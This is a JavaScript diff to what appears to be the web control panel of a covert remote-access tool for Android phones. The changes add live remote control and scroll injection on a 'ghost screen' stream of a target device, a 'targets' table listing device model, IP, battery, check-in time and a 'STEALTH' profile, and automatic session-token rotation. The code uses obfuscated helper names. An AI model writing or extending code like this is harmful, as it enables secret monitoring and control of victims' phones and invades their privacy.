@@ -31,7 +31,7 @@ let _ac = false;
 let audioStream = null;
 let _ih = null;
 
-// Session Stability & Render Proxy Fetch Wrapper
+// Session Stability & Render Proxy Fetch Wrapper with Auto-Token Rotation
 const originalFetch = window.fetch;
 window.fetch = async function(resource, init) {
   let url = resource;
@@ -45,7 +45,14 @@ window.fetch = async function(resource, init) {
   }
   try {
     const response = await originalFetch(url, init);
-    if (response.status === 401) {
+    if (response.status === 401 && !url.includes('/api/auth/rotate') && !url.includes('/login')) {
+      try {
+        const rotateRes = await originalFetch('/api/auth/rotate', { method: 'POST' });
+        if (rotateRes.ok) {
+          return await originalFetch(url, init);
+        }
+      } catch (rotateErr) {}
+
       showToast("SESSION_EXPIRED: Re-authenticating...", "error");
       setTimeout(() => {
         window.location.reload();
@@ -745,9 +752,10 @@ function startGhostScreen() {
   if (statusCard) statusCard.style.display = "none";
   const btn = document.getElementById("ghost-toggle-btn");
   if (btn) {
-    btn.innerText = "TERMINATE";
+    btn.innerHTML = "&#9209; TERMINATE";
     btn.style.borderColor = "var(--danger)";
     btn.style.color = "var(--danger)";
+    btn.style.background = "rgba(255, 49, 49, 0.15)";
   }
   refreshGhostScreen();
 }
@@ -761,9 +769,10 @@ function stopGhostScreen() {
   }
   const btn = document.getElementById("ghost-toggle-btn");
   if (btn) {
-    btn.innerText = "INITIATE_VIEW";
-    btn.style.borderColor = "var(--neon-green)";
-    btn.style.color = "var(--neon-green)";
+    btn.innerHTML = "INITIATE_VIEW";
+    btn.style.borderColor = "var(--neon-cyan)";
+    btn.style.color = "var(--neon-cyan)";
+    btn.style.background = "rgba(0, 242, 255, 0.05)";
   }
   const streamImg = document.getElementById("ghost-screen-stream");
   if (streamImg) streamImg.src = "";
@@ -797,7 +806,57 @@ function refreshGhostScreen() {
   }
 }
 
+window.isGhostControlLocked = false;
+
+function toggleGhostControlLock() {
+  window.isGhostControlLocked = !window.isGhostControlLocked;
+  const lockBtn = document.getElementById("ghost-lock-btn");
+  const lockOverlay = document.getElementById("ghost-lock-overlay");
+  const streamImg = document.getElementById("ghost-screen-stream");
+
+  if (window.isGhostControlLocked) {
+    if (lockBtn) {
+      lockBtn.innerHTML = "&#128274; SCROLL LOCKED";
+      lockBtn.style.borderColor = "var(--neon-yellow)";
+      lockBtn.style.color = "var(--neon-yellow)";
+      lockBtn.style.background = "rgba(255, 255, 0, 0.08)";
+    }
+    if (lockOverlay) lockOverlay.style.display = "flex";
+    if (streamImg) {
+      streamImg.style.touchAction = "auto";
+      streamImg.style.pointerEvents = "none";
+    }
+    showToast("PAGE_SCROLL_MODE_ENABLED");
+  } else {
+    if (lockBtn) {
+      lockBtn.innerHTML = "&#128994; CONTROL ACTIVE";
+      lockBtn.style.borderColor = "var(--neon-green)";
+      lockBtn.style.color = "var(--neon-green)";
+      lockBtn.style.background = "rgba(57, 255, 20, 0.08)";
+    }
+    if (lockOverlay) lockOverlay.style.display = "none";
+    if (streamImg) {
+      streamImg.style.touchAction = "none";
+      streamImg.style.pointerEvents = "auto";
+    }
+    showToast("REMOTE_CONTROL_ACTIVE");
+  }
+}
+
+function ghostScroll(dir) {
+  let actionName = "scroll_" + dir;
+  fetch("/ghost/interact?action=" + actionName)
+    .then(res => res.json())
+    .then(() => {
+      if (typeof showToast === "function") showToast("SCROLL_" + dir.toUpperCase() + "_SENT");
+    })
+    .catch(() => {
+      if (typeof showToast === "function") showToast("SCROLL_DISPATCH_FAILED", "error");
+    });
+}
+
 function startGhostDrag(e) {
+  if (window.isGhostControlLocked) return;
   if (e && e.stopPropagation) e.stopPropagation();
   const streamImg = document.getElementById("ghost-screen-stream");
   if (!streamImg) return;
@@ -818,6 +877,7 @@ function startGhostDrag(e) {
 }
 
 function endGhostDrag(e) {
+  if (window.isGhostControlLocked) return;
   if (e && e.stopPropagation) e.stopPropagation();
   if (!_0x2c) return;
 
@@ -1037,6 +1097,49 @@ function _0x5a(n, r, a, l, s) {
   r.appendChild(e);
   if (n.children) {
     n.children.forEach(c => _0x5a(c, r, a + 1, l, s));
+  }
+}
+
+async function refreshTargetsTable() {
+  const tbody = document.getElementById("targets-table-body");
+  if (!tbody) return;
+
+  try {
+    const res = await fetch("/terminal/targets");
+    const data = await res.json();
+    if (data && data.targets && Array.isArray(data.targets) && data.targets.length > 0) {
+      let urlParams = new URLSearchParams(window.location.search);
+      let currentDeviceId = urlParams.get('deviceId');
+
+      let target = data.targets[0];
+      if (currentDeviceId) {
+        let match = data.targets.find(t => t.deviceId === currentDeviceId || (t.deviceId && t.deviceId.toLowerCase() === currentDeviceId.toLowerCase()));
+        if (match) target = match;
+      }
+
+      let statusBadge = (target.status === "ONLINE" || !target.status)
+        ? '<span style="color:var(--neon-green); font-weight:bold; display:inline-flex; align-items:center; gap:4px;">&#128994; ONLINE</span>'
+        : '<span style="color:var(--danger); font-weight:bold; display:inline-flex; align-items:center; gap:4px;">&#128308; OFFLINE</span>';
+
+      let profileBadge = target.profile === "STEALTH"
+        ? '<span style="color:var(--neon-yellow); font-weight:bold;">STEALTH</span>'
+        : '<span style="color:var(--neon-green); font-weight:bold;">NORMAL</span>';
+
+      let row = `<tr style="background: rgba(255,255,255,0.02); border-radius: 6px;">
+        <td style="padding: 10px; color: var(--neon-cyan); font-weight: bold;">&#9999;&#65039; ${target.deviceId || 'samsung'}</td>
+        <td style="padding: 10px; color: #fff;">${target.model || 'SM-F731W'}</td>
+        <td style="padding: 10px; color: #ccc;">${target.osVersion || target.os || 'Android 16'}</td>
+        <td style="padding: 10px; color: #fff;">${target.battery || '100%'}</td>
+        <td style="padding: 10px; color: var(--neon-green); font-family: monospace;">${target.endpointIp || target.ip || '127.0.0.1:9191'}</td>
+        <td style="padding: 10px;">${statusBadge}</td>
+        <td style="padding: 10px;">${profileBadge}</td>
+        <td style="padding: 10px; color: #aaa;">${target.lastCheckIn || target.lastSeen || new Date().toLocaleString()}</td>
+      </tr>`;
+
+      tbody.innerHTML = row;
+    }
+  } catch (err) {
+    console.error("Targets refresh error:", err);
   }
 }
 
@@ -1663,6 +1766,11 @@ document.addEventListener("DOMContentLoaded", () => {
   if (document.getElementById("log-terminal")) {
     fetchLogs();
     setInterval(fetchLogs, 5000);
+  }
+
+  if (document.getElementById("targets-table-body")) {
+    refreshTargetsTable();
+    setInterval(refreshTargetsTable, 20000);
   }
 
   if (document.getElementById("ghost-status-card") || document.getElementById("ghost-screen-stream")) {
